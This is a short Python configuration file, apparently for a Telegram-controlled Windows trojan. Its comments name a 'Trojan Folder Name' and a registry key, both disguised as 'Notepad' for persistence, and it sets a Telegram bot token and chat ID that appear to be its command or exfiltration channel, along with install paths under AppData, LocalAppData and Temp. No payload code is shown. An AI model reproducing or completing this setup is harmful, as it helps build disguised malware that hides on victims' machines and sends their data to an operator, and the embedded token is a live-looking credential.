import os



DIRNAME = "Notepad" #Trojan Folder Name
NAMEOFREGKEY = "Notepad" #Registry Key to be named
TOKEN = "5422701932:AAFgYpceFm32H_QB6ZN6E0ohvviB9H17PyI"
CHAT_ID = "1747538159"


APPDATADIR = os.getenv("Appdata")+f"\\{DIRNAME}"
LOCALAPPDATADIR = os.getenv("LocalAppdata")+f"\\{DIRNAME}"
TEMPDIR = os.getenv("Temp")+f"\\{DIRNAME}"

